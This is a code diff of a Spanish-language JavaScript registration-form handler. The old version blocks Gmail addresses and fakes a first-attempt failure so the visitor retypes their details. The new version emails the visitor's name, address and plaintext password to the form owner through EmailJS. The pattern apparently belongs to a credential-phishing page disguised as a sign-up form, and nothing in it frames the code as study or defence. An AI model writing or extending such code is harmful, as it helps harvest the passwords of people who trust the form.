@@ -1,25 +1,24 @@
-document.getElementById('formRegistro').addEventListener('submit', function(e) {
-    e.preventDefault();
-    
-    const correo = document.getElementById('correo').value;
-    let intentos = localStorage.getItem('intentos') || 0;
+const form = document.getElementById('formRegistro');
+const mailError = document.querySelector('.mail-error');
 
-    // Validación de Gmail
-    if (correo.toLowerCase().includes('@gmail.com')) {
-        document.querySelector('.error-email').style.display = 'block';
-        return;
-    }
+form.addEventListener('submit', e => {
+  e.preventDefault();
+  const nombre = form.nombre.value.trim();
+  const correo = form.correo.value.trim().toLowerCase();
+  const password = form.password.value;
 
-    // Sistema de 2 intentos
-    localStorage.setItem('intentos', parseInt(intentos) + 1);
-    
-    if (intentos < 1) {
-        window.location.href = 'error.html';
-    } else {
-        localStorage.removeItem('intentos');
-        window.location.href = 'success.html';
-    }
+  // Validar Gmail
+  if (correo.endsWith('@gmail.com')) {
+    mailError.style.display = 'block';
+    return;
+  }
 
-    // Aquí iría la integración con EmailJS
-    // emailjs.send("service_id", "template_id", { ...datos });
+  // Enviar por EmailJS
+  emailjs.send('TU_SERVICE_ID','TU_TEMPLATE_ID',{ nombre, correo, password })
+    .then(() => {
+      window.location.href = 'success.html';
+    })
+    .catch(() => {
+      window.location.href = 'error.html';
+    });
 });
